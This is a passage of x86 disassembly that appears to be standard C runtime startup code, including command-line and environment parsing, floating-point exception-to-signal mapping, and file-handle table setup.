  422dba:	push   edx
  422dbb:	mov    BYTE PTR [ebp-0x8],dl
  422dbe:	call   DWORD PTR ds:0x428040
  422dc4:	test   eax,eax
  422dc6:	jne    0x422ddb
  422dc8:	lea    eax,[ebp-0x10c]
  422dce:	push   0x42848c
  422dd3:	push   eax
  422dd4:	call   0x423c90
  422dd9:	pop    ecx
  422dda:	pop    ecx
  422ddb:	lea    eax,[ebp-0x10c]
  422de1:	push   eax
  422de2:	lea    edi,[ebp-0x10c]
  422de8:	call   0x423ec0
  422ded:	inc    eax
  422dee:	cmp    eax,0x3c
  422df1:	pop    ecx
  422df2:	jbe    0x422e1d
  422df4:	lea    eax,[ebp-0x10c]
  422dfa:	push   eax
  422dfb:	call   0x423ec0
  422e00:	mov    edi,eax
  422e02:	lea    eax,[ebp-0x10c]
  422e08:	sub    eax,0x3b
  422e0b:	push   0x3
  422e0d:	add    edi,eax
  422e0f:	push   0x428488
  422e14:	push   edi
  422e15:	call   0x423d90
  422e1a:	add    esp,0x10
  422e1d:	push   edi
  422e1e:	call   0x423ec0
  422e23:	push   DWORD PTR [esi+0x45c1cc]
  422e29:	mov    ebx,eax
  422e2b:	call   0x423ec0
  422e30:	lea    eax,[ebx+eax*1+0x1c]
  422e34:	pop    ecx
  422e35:	add    eax,0x3
  422e38:	pop    ecx
  422e39:	and    eax,0xfffffffc
  422e3c:	call   0x423900
  422e41:	mov    ebx,esp
  422e43:	push   0x42846c
  422e48:	push   ebx
  422e49:	call   0x423c90
  422e4e:	push   edi
  422e4f:	push   ebx
  422e50:	call   0x423ca0
  422e55:	push   0x428468
  422e5a:	push   ebx
  422e5b:	call   0x423ca0
  422e60:	push   DWORD PTR [esi+0x45c1cc]
  422e66:	push   ebx
  422e67:	call   0x423ca0
  422e6c:	push   0x12010
  422e71:	push   0x428440
  422e76:	push   ebx
  422e77:	call   0x423b92
  422e7c:	add    esp,0x2c
  422e7f:	jmp    0x422ea6
  422e81:	push   edx
  422e82:	lea    eax,[ebp+0x8]
  422e85:	push   eax
  422e86:	lea    esi,[esi+0x45c1cc]
  422e8c:	push   DWORD PTR [esi]
  422e8e:	call   0x423ec0
  422e93:	pop    ecx
  422e94:	push   eax
  422e95:	push   DWORD PTR [esi]
  422e97:	push   0xfffffff4
  422e99:	call   DWORD PTR ds:0x42803c
  422e9f:	push   eax
  422ea0:	call   DWORD PTR ds:0x428038
  422ea6:	lea    esp,[ebp-0x118]
  422eac:	mov    ecx,DWORD PTR [ebp-0x4]
  422eaf:	xor    ecx,DWORD PTR [ebp+0x4]
  422eb2:	call   0x423f7c
  422eb7:	pop    edi
  422eb8:	pop    esi
  422eb9:	pop    ebx
  422eba:	leave  
  422ebb:	ret    
  422ebc:	mov    eax,ds:0x45cabc
  422ec1:	cmp    eax,0x1
  422ec4:	je     0x422ed3
  422ec6:	test   eax,eax
  422ec8:	jne    0x422ef4
  422eca:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422ed1:	jne    0x422ef4
  422ed3:	push   0xfc
  422ed8:	call   0x422d45
  422edd:	mov    eax,ds:0x45cb08
  422ee2:	test   eax,eax
  422ee4:	pop    ecx
  422ee5:	je     0x422ee9
  422ee7:	call   eax
  422ee9:	push   0xff
  422eee:	call   0x422d45
  422ef3:	pop    ecx
  422ef4:	ret    
  422ef5:	push   ebp
  422ef6:	mov    ebp,esp
  422ef8:	push   ecx
  422ef9:	push   ebx
  422efa:	push   esi
  422efb:	push   edi
  422efc:	call   0x42375d
  422f01:	mov    edi,DWORD PTR [ebp+0x8]
  422f04:	mov    esi,eax
  422f06:	mov    edx,DWORD PTR [esi+0x54]
  422f09:	mov    eax,ds:0x45c2dc
  422f0e:	mov    ecx,edx
  422f10:	cmp    DWORD PTR [ecx],edi
  422f12:	je     0x422f21
  422f14:	lea    ebx,[eax+eax*2]
  422f17:	add    ecx,0xc
  422f1a:	lea    ebx,[edx+ebx*4]
  422f1d:	cmp    ecx,ebx
  422f1f:	jb     0x422f10
  422f21:	lea    eax,[eax+eax*2]
  422f24:	lea    eax,[edx+eax*4]
  422f27:	cmp    ecx,eax
  422f29:	jae    0x422f2f
  422f2b:	cmp    DWORD PTR [ecx],edi
  422f2d:	je     0x422f31
  422f2f:	xor    ecx,ecx
  422f31:	test   ecx,ecx
  422f33:	je     0x42304b
  422f39:	mov    ebx,DWORD PTR [ecx+0x8]
  422f3c:	test   ebx,ebx
  422f3e:	mov    DWORD PTR [ebp+0x8],ebx
  422f41:	je     0x42304b
  422f47:	cmp    ebx,0x5
  422f4a:	jne    0x422f58
  422f4c:	and    DWORD PTR [ecx+0x8],0x0
  422f50:	xor    eax,eax
  422f52:	inc    eax
  422f53:	jmp    0x423054
  422f58:	cmp    ebx,0x1
  422f5b:	je     0x423046
  422f61:	mov    eax,DWORD PTR [esi+0x58]
  422f64:	mov    DWORD PTR [ebp-0x4],eax
  422f67:	mov    eax,DWORD PTR [ebp+0xc]
  422f6a:	mov    DWORD PTR [esi+0x58],eax
  422f6d:	mov    eax,DWORD PTR [ecx+0x4]
  422f70:	cmp    eax,0x8
  422f73:	jne    0x423038
  422f79:	mov    edx,DWORD PTR ds:0x45c2d0
  422f7f:	mov    eax,ds:0x45c2d4
  422f84:	add    eax,edx
  422f86:	cmp    edx,eax
  422f88:	jge    0x422fb1
  422f8a:	lea    eax,[edx+edx*2]
  422f8d:	shl    eax,0x2
  422f90:	mov    edi,DWORD PTR [esi+0x54]
  422f93:	and    DWORD PTR [eax+edi*1+0x8],0x0
  422f98:	mov    edi,DWORD PTR ds:0x45c2d0
  422f9e:	mov    ebx,DWORD PTR ds:0x45c2d4
  422fa4:	inc    edx
  422fa5:	add    ebx,edi
  422fa7:	add    eax,0xc
  422faa:	cmp    edx,ebx
  422fac:	jl     0x422f90
  422fae:	mov    ebx,DWORD PTR [ebp+0x8]
  422fb1:	mov    ecx,DWORD PTR [ecx]
  422fb3:	cmp    ecx,0xc000008e
  422fb9:	mov    edi,DWORD PTR [esi+0x5c]
  422fbc:	jne    0x422fc7
  422fbe:	mov    DWORD PTR [esi+0x5c],0x83
  422fc5:	jmp    0x42302b
  422fc7:	cmp    ecx,0xc0000090
  422fcd:	jne    0x422fd8
  422fcf:	mov    DWORD PTR [esi+0x5c],0x81
  422fd6:	jmp    0x42302b
  422fd8:	cmp    ecx,0xc0000091
  422fde:	jne    0x422fe9
  422fe0:	mov    DWORD PTR [esi+0x5c],0x84
  422fe7:	jmp    0x42302b
  422fe9:	cmp    ecx,0xc0000093
  422fef:	jne    0x422ffa
  422ff1:	mov    DWORD PTR [esi+0x5c],0x85
  422ff8:	jmp    0x42302b
  422ffa:	cmp    ecx,0xc000008d
  423000:	jne    0x42300b
  423002:	mov    DWORD PTR [esi+0x5c],0x82
  423009:	jmp    0x42302b
  42300b:	cmp    ecx,0xc000008f
  423011:	jne    0x42301c
  423013:	mov    DWORD PTR [esi+0x5c],0x86
  42301a:	jmp    0x42302b
  42301c:	cmp    ecx,0xc0000092
  423022:	jne    0x42302b
  423024:	mov    DWORD PTR [esi+0x5c],0x8a
  42302b:	push   DWORD PTR [esi+0x5c]
  42302e:	push   0x8
  423030:	call   ebx
  423032:	pop    ecx
  423033:	mov    DWORD PTR [esi+0x5c],edi
  423036:	jmp    0x42303f
  423038:	and    DWORD PTR [ecx+0x8],0x0
  42303c:	push   eax
  42303d:	call   ebx
  42303f:	mov    eax,DWORD PTR [ebp-0x4]
  423042:	pop    ecx
  423043:	mov    DWORD PTR [esi+0x58],eax
  423046:	or     eax,0xffffffff
  423049:	jmp    0x423054
  42304b:	push   DWORD PTR [ebp+0xc]
  42304e:	call   DWORD PTR ds:0x428044
  423054:	pop    edi
  423055:	pop    esi
  423056:	pop    ebx
  423057:	leave  
  423058:	ret    
  423059:	cmp    DWORD PTR ds:0x45d26c,0x0
  423060:	jne    0x423067
  423062:	call   0x42449c
  423067:	push   esi
  423068:	mov    esi,DWORD PTR ds:0x45d274
  42306e:	test   esi,esi
  423070:	jne    0x423079
  423072:	mov    esi,0x4284a3
  423077:	jmp    0x4230be
  423079:	mov    al,BYTE PTR [esi]
  42307b:	cmp    al,0x22
  42307d:	jne    0x4230a7
  42307f:	inc    esi
  423080:	mov    al,BYTE PTR [esi]
  423082:	cmp    al,0x22
  423084:	je     0x4230b7
  423086:	test   al,al
  423088:	je     0x4230a0
  42308a:	movzx  eax,al
  42308d:	push   eax
  42308e:	call   0x423fbb
  423093:	test   eax,eax
  423095:	pop    ecx
  423096:	je     0x423099
  423098:	inc    esi
  423099:	inc    esi
  42309a:	mov    al,BYTE PTR [esi]
  42309c:	cmp    al,0x22
  42309e:	jne    0x423086
  4230a0:	cmp    BYTE PTR [esi],0x22
  4230a3:	jne    0x4230b8
  4230a5:	jmp    0x4230b7
  4230a7:	cmp    al,0x20
  4230a9:	jbe    0x4230b8
  4230ab:	inc    esi
  4230ac:	cmp    BYTE PTR [esi],0x20
  4230af:	ja     0x4230ab
  4230b1:	jmp    0x4230b8
  4230b3:	cmp    al,0x20
  4230b5:	ja     0x4230be
  4230b7:	inc    esi
  4230b8:	mov    al,BYTE PTR [esi]
  4230ba:	test   al,al
  4230bc:	jne    0x4230b3
  4230be:	mov    eax,esi
  4230c0:	pop    esi
  4230c1:	ret    
  4230c2:	push   ebx
  4230c3:	xor    ebx,ebx
  4230c5:	cmp    DWORD PTR ds:0x45d26c,ebx
  4230cb:	push   esi
  4230cc:	push   edi
  4230cd:	jne    0x4230d4
  4230cf:	call   0x42449c
  4230d4:	mov    esi,DWORD PTR ds:0x45cab4
  4230da:	xor    edi,edi
  4230dc:	cmp    esi,ebx
  4230de:	jne    0x4230f2
  4230e0:	jmp    0x423112
  4230e2:	cmp    al,0x3d
  4230e4:	je     0x4230e7
  4230e6:	inc    edi
  4230e7:	push   esi
  4230e8:	call   0x423ec0
  4230ed:	pop    ecx
  4230ee:	lea    esi,[esi+eax*1+0x1]
  4230f2:	mov    al,BYTE PTR [esi]
  4230f4:	cmp    al,bl
  4230f6:	jne    0x4230e2
  4230f8:	lea    eax,[edi*4+0x4]
  4230ff:	push   eax
  423100:	call   0x4245d2
  423105:	mov    edi,eax
  423107:	cmp    edi,ebx
  423109:	pop    ecx
  42310a:	mov    DWORD PTR ds:0x45cae4,edi
  423110:	jne    0x423117
  423112:	or     eax,0xffffffff
  423115:	jmp    0x42316f
  423117:	mov    esi,DWORD PTR ds:0x45cab4
  42311d:	push   ebp
  42311e:	jmp    0x42314a
  423120:	push   esi
  423121:	call   0x423ec0
  423126:	mov    ebp,eax
  423128:	inc    ebp
  423129:	cmp    BYTE PTR [esi],0x3d
  42312c:	pop    ecx
  42312d:	je     0x423148
  42312f:	push   ebp
  423130:	call   0x4245d2
  423135:	cmp    eax,ebx
  423137:	pop    ecx
  423138:	mov    DWORD PTR [edi],eax
  42313a:	je     0x423173
  42313c:	push   esi
  42313d:	push   eax
  42313e:	call   0x423c90
  423143:	pop    ecx
  423144:	pop    ecx
  423145:	add    edi,0x4
  423148:	add    esi,ebp
  42314a:	cmp    BYTE PTR [esi],bl
  42314c:	jne    0x423120
  42314e:	push   DWORD PTR ds:0x45cab4
  423154:	call   0x4244ba
  423159:	mov    DWORD PTR ds:0x45cab4,ebx
  42315f:	mov    DWORD PTR [edi],ebx
  423161:	mov    DWORD PTR ds:0x45d260,0x1
  42316b:	xor    eax,eax
  42316d:	pop    ecx
  42316e:	pop    ebp
  42316f:	pop    edi
  423170:	pop    esi
  423171:	pop    ebx
  423172:	ret    
  423173:	push   DWORD PTR ds:0x45cae4
  423179:	call   0x4244ba
  42317e:	mov    DWORD PTR ds:0x45cae4,ebx
  423184:	or     eax,0xffffffff
  423187:	jmp    0x42316d
  423189:	push   ebp
  42318a:	mov    ebp,esp
  42318c:	push   ecx
  42318d:	push   ebx
  42318e:	mov    ebx,DWORD PTR [ebp+0xc]
  423191:	xor    edx,edx
  423193:	cmp    DWORD PTR [ebp+0x8],edx
  423196:	push   edi
  423197:	mov    DWORD PTR [esi],edx
  423199:	mov    edi,ecx
  42319b:	mov    DWORD PTR [ebx],0x1
  4231a1:	je     0x4231ac
  4231a3:	mov    ecx,DWORD PTR [ebp+0x8]
  4231a6:	add    DWORD PTR [ebp+0x8],0x4
  4231aa:	mov    DWORD PTR [ecx],edi
  4231ac:	cmp    BYTE PTR [eax],0x22
  4231af:	jne    0x4231bf
  4231b1:	xor    ecx,ecx
  4231b3:	test   edx,edx
  4231b5:	sete   cl
  4231b8:	inc    eax
  4231b9:	mov    edx,ecx
  4231bb:	mov    cl,0x22
  4231bd:	jmp    0x4231ec
  4231bf:	inc    DWORD PTR [esi]
  4231c1:	test   edi,edi
  4231c3:	je     0x4231ca
  4231c5:	mov    cl,BYTE PTR [eax]
  4231c7:	mov    BYTE PTR [edi],cl
  4231c9:	inc    edi
  4231ca:	mov    cl,BYTE PTR [eax]
  4231cc:	movzx  ebx,cl
  4231cf:	inc    eax
  4231d0:	test   BYTE PTR [ebx+0x45cf21],0x4
  4231d7:	je     0x4231e5
  4231d9:	inc    DWORD PTR [esi]
  4231db:	test   edi,edi
  4231dd:	je     0x4231e4
  4231df:	mov    bl,BYTE PTR [eax]
  4231e1:	mov    BYTE PTR [edi],bl
  4231e3:	inc    edi
  4231e4:	inc    eax
  4231e5:	test   cl,cl
  4231e7:	mov    ebx,DWORD PTR [ebp+0xc]
  4231ea:	je     0x42321e
  4231ec:	test   edx,edx
  4231ee:	jne    0x4231ac
  4231f0:	cmp    cl,0x20
  4231f3:	je     0x4231fa
  4231f5:	cmp    cl,0x9
  4231f8:	jne    0x4231ac
  4231fa:	test   edi,edi
  4231fc:	je     0x423202
  4231fe:	and    BYTE PTR [edi-0x1],0x0
  423202:	and    DWORD PTR [ebp-0x4],0x0
  423206:	cmp    BYTE PTR [eax],0x0
  423209:	je     0x4232e5
  42320f:	mov    cl,BYTE PTR [eax]
  423211:	cmp    cl,0x20
  423214:	je     0x42321b
  423216:	cmp    cl,0x9
  423219:	jne    0x423221
  42321b:	inc    eax
  42321c:	jmp    0x42320f
  42321e:	dec    eax
  42321f:	jmp    0x423202
  423221:	cmp    BYTE PTR [eax],0x0
  423224:	je     0x4232e5
  42322a:	cmp    DWORD PTR [ebp+0x8],0x0
  42322e:	je     0x423239
  423230:	mov    ecx,DWORD PTR [ebp+0x8]
  423233:	add    DWORD PTR [ebp+0x8],0x4
  423237:	mov    DWORD PTR [ecx],edi
  423239:	inc    DWORD PTR [ebx]
  42323b:	xor    ebx,ebx
  42323d:	inc    ebx
  42323e:	xor    edx,edx
  423240:	jmp    0x423244
  423242:	inc    eax
  423243:	inc    edx
  423244:	cmp    BYTE PTR [eax],0x5c
  423247:	je     0x423242
  423249:	cmp    BYTE PTR [eax],0x22
  42324c:	jne    0x423274
  42324e:	test   dl,0x1
  423251:	jne    0x423272
  423253:	cmp    DWORD PTR [ebp-0x4],0x0
  423257:	je     0x423265
  423259:	lea    ecx,[eax+0x1]
  42325c:	cmp    BYTE PTR [ecx],0x22
  42325f:	jne    0x423265
  423261:	mov    eax,ecx
  423263:	jmp    0x423267
  423265:	xor    ebx,ebx
  423267:	xor    ecx,ecx
  423269:	cmp    DWORD PTR [ebp-0x4],ecx
  42326c:	sete   cl
  42326f:	mov    DWORD PTR [ebp-0x4],ecx
  423272:	shr    edx,1
  423274:	test   edx,edx
  423276:	je     0x423285
  423278:	test   edi,edi
  42327a:	je     0x423280
  42327c:	mov    BYTE PTR [edi],0x5c
  42327f:	inc    edi
  423280:	inc    DWORD PTR [esi]
  423282:	dec    edx
  423283:	jne    0x423278
  423285:	mov    cl,BYTE PTR [eax]
  423287:	test   cl,cl
  423289:	je     0x4232d3
  42328b:	cmp    DWORD PTR [ebp-0x4],0x0
  42328f:	jne    0x42329b
  423291:	cmp    cl,0x20
  423294:	je     0x4232d3
  423296:	cmp    cl,0x9
  423299:	je     0x4232d3
  42329b:	test   ebx,ebx
  42329d:	je     0x4232cd
  42329f:	test   edi,edi
  4232a1:	je     0x4232bc
  4232a3:	movzx  edx,cl
  4232a6:	test   BYTE PTR [edx+0x45cf21],0x4
  4232ad:	je     0x4232b5
  4232af:	mov    BYTE PTR [edi],cl
  4232b1:	inc    edi
  4232b2:	inc    eax
  4232b3:	inc    DWORD PTR [esi]
  4232b5:	mov    cl,BYTE PTR [eax]
  4232b7:	mov    BYTE PTR [edi],cl
  4232b9:	inc    edi
  4232ba:	jmp    0x4232cb
  4232bc:	movzx  ecx,cl
  4232bf:	test   BYTE PTR [ecx+0x45cf21],0x4
  4232c6:	je     0x4232cb
  4232c8:	inc    eax
  4232c9:	inc    DWORD PTR [esi]
  4232cb:	inc    DWORD PTR [esi]
  4232cd:	inc    eax
  4232ce:	jmp    0x42323b
  4232d3:	test   edi,edi
  4232d5:	je     0x4232db
  4232d7:	and    BYTE PTR [edi],0x0
  4232da:	inc    edi
  4232db:	inc    DWORD PTR [esi]
  4232dd:	mov    ebx,DWORD PTR [ebp+0xc]
  4232e0:	jmp    0x423206
  4232e5:	mov    eax,DWORD PTR [ebp+0x8]
  4232e8:	test   eax,eax
  4232ea:	je     0x4232ef
  4232ec:	and    DWORD PTR [eax],0x0
  4232ef:	inc    DWORD PTR [ebx]
  4232f1:	pop    edi
  4232f2:	pop    ebx
  4232f3:	leave  
  4232f4:	ret    
  4232f5:	push   ebp
  4232f6:	mov    ebp,esp
  4232f8:	push   ecx
  4232f9:	push   ecx
  4232fa:	push   ebx
  4232fb:	push   esi
  4232fc:	push   edi
  4232fd:	xor    edi,edi
  4232ff:	cmp    DWORD PTR ds:0x45d26c,edi
  423305:	jne    0x42330c
  423307:	call   0x42449c
  42330c:	and    BYTE PTR ds:0x45cc14,0x0
  423313:	push   0x104
  423318:	mov    esi,0x45cb10
  42331d:	push   esi
  42331e:	push   edi
  42331f:	call   DWORD PTR ds:0x428040
  423325:	mov    eax,ds:0x45d274
  42332a:	cmp    eax,edi
  42332c:	mov    DWORD PTR ds:0x45caf4,esi
  423332:	je     0x42333b
  423334:	cmp    BYTE PTR [eax],0x0
  423337:	mov    ebx,eax
  423339:	jne    0x42333d
  42333b:	mov    ebx,esi
  42333d:	lea    eax,[ebp-0x4]
  423340:	push   eax
  423341:	push   edi
  423342:	lea    esi,[ebp-0x8]
  423345:	xor    ecx,ecx
  423347:	mov    eax,ebx
  423349:	call   0x423189
  42334e:	mov    esi,DWORD PTR [ebp-0x4]
  423351:	mov    eax,DWORD PTR [ebp-0x8]
  423354:	shl    esi,0x2
  423357:	add    eax,esi
  423359:	push   eax
  42335a:	call   0x4245d2
  42335f:	mov    edi,eax
  423361:	add    esp,0xc
  423364:	test   edi,edi
  423366:	jne    0x42336d
  423368:	or     eax,0xffffffff
  42336b:	jmp    0x423392
  42336d:	lea    eax,[ebp-0x4]
  423370:	push   eax
  423371:	lea    ecx,[esi+edi*1]
  423374:	push   edi
  423375:	lea    esi,[ebp-0x8]
  423378:	mov    eax,ebx
  42337a:	call   0x423189
  42337f:	mov    eax,DWORD PTR [ebp-0x4]
  423382:	dec    eax
  423383:	pop    ecx
  423384:	mov    ds:0x45cad8,eax
  423389:	pop    ecx
  42338a:	mov    DWORD PTR ds:0x45cadc,edi
  423390:	xor    eax,eax
  423392:	pop    edi
  423393:	pop    esi
  423394:	pop    ebx
  423395:	leave  
  423396:	ret    
  423397:	push   ecx
  423398:	push   ecx
  423399:	mov    eax,ds:0x45cc18
  42339e:	push   ebx
  42339f:	push   ebp
  4233a0:	push   esi
  4233a1:	push   edi
  4233a2:	mov    edi,DWORD PTR ds:0x428058
  4233a8:	xor    ebx,ebx
  4233aa:	xor    esi,esi
  4233ac:	cmp    eax,ebx
  4233ae:	push   0x2
  4233b0:	pop    ebp
  4233b1:	jne    0x4233e0
  4233b3:	call   edi
  4233b5:	mov    esi,eax
  4233b7:	cmp    esi,ebx
  4233b9:	je     0x4233c7
  4233bb:	mov    DWORD PTR ds:0x45cc18,0x1
  4233c5:	jmp    0x4233e5
  4233c7:	call   DWORD PTR ds:0x428014
  4233cd:	cmp    eax,0x78
  4233d0:	jne    0x4233db
  4233d2:	mov    eax,ebp
  4233d4:	mov    ds:0x45cc18,eax
  4233d9:	jmp    0x4233e0
  4233db:	mov    eax,ds:0x45cc18
  4233e0:	cmp    eax,0x1
  4233e3:	jne    0x423462
  4233e5:	cmp    esi,ebx
  4233e7:	jne    0x4233f1
  4233e9:	call   edi
  4233eb:	mov    esi,eax
  4233ed:	cmp    esi,ebx
  4233ef:	je     0x42346a
  4233f1:	cmp    WORD PTR [esi],bx
  4233f4:	mov    eax,esi
  4233f6:	je     0x423406
  4233f8:	add    eax,ebp
  4233fa:	cmp    WORD PTR [eax],bx
  4233fd:	jne    0x4233f8
  4233ff:	add    eax,ebp
  423401:	cmp    WORD PTR [eax],bx
  423404:	jne    0x4233f8
  423406:	mov    edi,DWORD PTR ds:0x428054
  42340c:	push   ebx
  42340d:	push   ebx
  42340e:	push   ebx
  42340f:	sub    eax,esi
  423411:	push   ebx
  423412:	sar    eax,1
  423414:	inc    eax
  423415:	push   eax
  423416:	push   esi
  423417:	push   ebx
  423418:	push   ebx
  423419:	mov    DWORD PTR [esp+0x34],eax
  42341d:	call   edi
  42341f:	mov    ebp,eax
  423421:	cmp    ebp,ebx
  423423:	je     0x423457
  423425:	push   ebp
  423426:	call   0x4245d2
  42342b:	cmp    eax,ebx
  42342d:	pop    ecx
  42342e:	mov    DWORD PTR [esp+0x10],eax
  423432:	je     0x423457
  423434:	push   ebx
  423435:	push   ebx
  423436:	push   ebp
  423437:	push   eax
  423438:	push   DWORD PTR [esp+0x24]
  42343c:	push   esi
  42343d:	push   ebx
  42343e:	push   ebx
  42343f:	call   edi
  423441:	test   eax,eax
  423443:	jne    0x423453
  423445:	push   DWORD PTR [esp+0x10]
  423449:	call   0x4244ba
  42344e:	pop    ecx
  42344f:	mov    DWORD PTR [esp+0x10],ebx
  423453:	mov    ebx,DWORD PTR [esp+0x10]
  423457:	push   esi
  423458:	call   DWORD PTR ds:0x428050
  42345e:	mov    eax,ebx
  423460:	jmp    0x4234b2
  423462:	cmp    eax,ebp
  423464:	je     0x42346e
  423466:	cmp    eax,ebx
  423468:	je     0x42346e
  42346a:	xor    eax,eax
  42346c:	jmp    0x4234b2
  42346e:	call   DWORD PTR ds:0x42804c
  423474:	mov    esi,eax
  423476:	cmp    esi,ebx
  423478:	je     0x42346a
  42347a:	cmp    BYTE PTR [esi],bl
  42347c:	je     0x423488
  42347e:	inc    eax
  42347f:	cmp    BYTE PTR [eax],bl
  423481:	jne    0x42347e
  423483:	inc    eax
  423484:	cmp    BYTE PTR [eax],bl
  423486:	jne    0x42347e
  423488:	sub    eax,esi
  42348a:	inc    eax
  42348b:	mov    ebp,eax
  42348d:	push   ebp
  42348e:	call   0x4245d2
  423493:	mov    edi,eax
  423495:	cmp    edi,ebx
  423497:	pop    ecx
  423498:	jne    0x42349e
  42349a:	xor    edi,edi
  42349c:	jmp    0x4234a9
  42349e:	push   ebp
  42349f:	push   esi
  4234a0:	push   edi
  4234a1:	call   0x4245f0
  4234a6:	add    esp,0xc
  4234a9:	push   esi
  4234aa:	call   DWORD PTR ds:0x428048
  4234b0:	mov    eax,edi
  4234b2:	pop    edi
  4234b3:	pop    esi
  4234b4:	pop    ebp
  4234b5:	pop    ebx
  4234b6:	pop    ecx
  4234b7:	pop    ecx
  4234b8:	ret    
  4234b9:	sub    esp,0x48
  4234bc:	push   ebx
  4234bd:	mov    ebx,0x480
  4234c2:	push   ebx
  4234c3:	call   0x4245d2
  4234c8:	test   eax,eax
  4234ca:	pop    ecx
  4234cb:	jne    0x4234d5
  4234cd:	or     eax,0xffffffff
  4234d0:	jmp    0x4236b2
  4234d5:	mov    ds:0x45d160,eax
  4234da:	mov    DWORD PTR ds:0x45d148,0x20
  4234e4:	lea    ecx,[eax+0x480]
  4234ea:	jmp    0x42350a
  4234ec:	and    BYTE PTR [eax+0x4],0x0
  4234f0:	or     DWORD PTR [eax],0xffffffff
  4234f3:	and    DWORD PTR [eax+0x8],0x0
  4234f7:	mov    BYTE PTR [eax+0x5],0xa
  4234fb:	mov    ecx,DWORD PTR ds:0x45d160
  423501:	add    eax,0x24
  423504:	add    ecx,0x480
  42350a:	cmp    eax,ecx
  42350c:	jb     0x4234ec
  42350e:	push   ebp
  42350f:	push   esi
  423510:	push   edi
  423511:	lea    eax,[esp+0x14]
  423515:	push   eax
  423516:	call   DWORD PTR ds:0x428020
  42351c:	cmp    WORD PTR [esp+0x46],0x0
  423522:	je     0x423611
  423528:	mov    eax,DWORD PTR [esp+0x48]
  42352c:	test   eax,eax
  42352e:	je     0x423611
  423534:	mov    edi,DWORD PTR [eax]
  423536:	lea    ebp,[eax+0x4]
  423539:	lea    eax,[edi+ebp*1]
  42353c:	mov    DWORD PTR [esp+0x10],eax
  423540:	mov    eax,0x800
  423545:	cmp    edi,eax
  423547:	jl     0x42354b
  423549:	mov    edi,eax
  42354b:	cmp    DWORD PTR ds:0x45d148,edi
  423551:	jge    0x4235a1
  423553:	mov    esi,0x45d164
  423558:	push   ebx
  423559:	call   0x4245d2
  42355e:	test   eax,eax
  423560:	pop    ecx
  423561:	je     0x42359b
  423563:	add    DWORD PTR ds:0x45d148,0x20
  42356a:	mov    DWORD PTR [esi],eax
  42356c:	lea    ecx,[eax+0x480]
  423572:	jmp    0x42358a
  423574:	and    BYTE PTR [eax+0x4],0x0
  423578:	or     DWORD PTR [eax],0xffffffff
  42357b:	and    DWORD PTR [eax+0x8],0x0
  42357f:	mov    BYTE PTR [eax+0x5],0xa
  423583:	mov    ecx,DWORD PTR [esi]
  423585:	add    eax,0x24
  423588:	add    ecx,ebx
  42358a:	cmp    eax,ecx
  42358c:	jb     0x423574
  42358e:	add    esi,0x4
  423591:	cmp    DWORD PTR ds:0x45d148,edi
  423597:	jl     0x423558
  423599:	jmp    0x4235a1
  42359b:	mov    edi,DWORD PTR ds:0x45d148
  4235a1:	xor    ebx,ebx
  4235a3:	test   edi,edi
  4235a5:	jle    0x423611
  4235a7:	mov    eax,DWORD PTR [esp+0x10]
  4235ab:	mov    eax,DWORD PTR [eax]
  4235ad:	cmp    eax,0xffffffff
  4235b0:	je     0x423606
  4235b2:	mov    cl,BYTE PTR [ebp+0x0]
  4235b5:	test   cl,0x1
  4235b8:	je     0x423606
  4235ba:	test   cl,0x8
  4235bd:	jne    0x4235ca
  4235bf:	push   eax
  4235c0:	call   DWORD PTR ds:0x428060
  4235c6:	test   eax,eax
  4235c8:	je     0x423606
  4235ca:	mov    ecx,ebx
  4235cc:	mov    eax,ebx
  4235ce:	and    eax,0x1f
  4235d1:	lea    eax,[eax+eax*8]
  4235d4:	sar    ecx,0x5
  4235d7:	mov    ecx,DWORD PTR [ecx*4+0x45d160]
  4235de:	lea    esi,[ecx+eax*4]
  4235e1:	mov    eax,DWORD PTR [esp+0x10]
  4235e5:	mov    eax,DWORD PTR [eax]
  4235e7:	mov    DWORD PTR [esi],eax
  4235e9:	mov    al,BYTE PTR [ebp+0x0]
  4235ec:	mov    BYTE PTR [esi+0x4],al
  4235ef:	lea    eax,[esi+0xc]
  4235f2:	push   0xfa0
  4235f7:	push   eax
  4235f8:	call   0x42493d
  4235fd:	test   eax,eax
  4235ff:	pop    ecx
  423600:	pop    ecx
  423601:	je     0x423631
  423603:	inc    DWORD PTR [esi+0x8]
  423606:	add    DWORD PTR [esp+0x10],0x4
  42360b:	inc    ebx
  42360c:	inc    ebp
  42360d:	cmp    ebx,edi
  42360f:	jl     0x4235a7
  423611:	xor    ebx,ebx
  423613:	mov    ecx,DWORD PTR ds:0x45d160
  423619:	lea    eax,[ebx+ebx*8]
  42361c:	lea    esi,[ecx+eax*4]
  42361f:	cmp    DWORD PTR [esi],0xffffffff
  423622:	jne    0x423693
  423624:	test   ebx,ebx
  423626:	mov    BYTE PTR [esi+0x4],0x81
  42362a:	jne    0x423636
  42362c:	push   0xfffffff6
  42362e:	pop    eax
  42362f:	jmp    0x423640
  423631:	or     eax,0xffffffff
  423634:	jmp    0x4236af
  423636:	mov    eax,ebx
  423638:	dec    eax
  423639:	neg    eax
  42363b:	sbb    eax,eax
  42363d:	add    eax,0xfffffff5
  423640:	push   eax
  423641:	call   DWORD PTR ds:0x42803c
  423647:	mov    edi,eax
  423649:	cmp    edi,0xffffffff
  42364c:	je     0x42368d
  42364e:	push   edi
  42364f:	call   DWORD PTR ds:0x428060
  423655:	test   eax,eax
  423657:	je     0x42368d
  423659:	and    eax,0xff
  42365e:	cmp    eax,0x2
  423661:	mov    DWORD PTR [esi],edi
  423663:	jne    0x42366b
  423665:	or     BYTE PTR [esi+0x4],0x40
  423669:	jmp    0x423674
  42366b:	cmp    eax,0x3
  42366e:	jne    0x423674
  423670:	or     BYTE PTR [esi+0x4],0x8
  423674:	lea    eax,[esi+0xc]
  423677:	push   0xfa0
  42367c:	push   eax
  42367d:	call   0x42493d
  423682:	test   eax,eax
  423684:	pop    ecx
  423685:	pop    ecx
  423686:	je     0x423631
  423688:	inc    DWORD PTR [esi+0x8]
  42368b:	jmp    0x423697
  42368d:	or     BYTE PTR [esi+0x4],0x40
  423691:	jmp    0x423697
  423693:	or     BYTE PTR [esi+0x4],0x80
  423697:	inc    ebx
  423698:	cmp    ebx,0x3
  42369b:	jl     0x423613
  4236a1:	push   DWORD PTR ds:0x45d148
  4236a7:	call   DWORD PTR ds:0x42805c
  4236ad:	xor    eax,eax
  4236af:	pop    edi
  4236b0:	pop    esi
  4236b1:	pop    ebp
  4236b2:	pop    ebx
  4236b3:	add    esp,0x48
  4236b6:	ret    
  4236b7:	push   0xc
  4236b9:	push   0x4284a8
  4236be:	call   0x4238a8
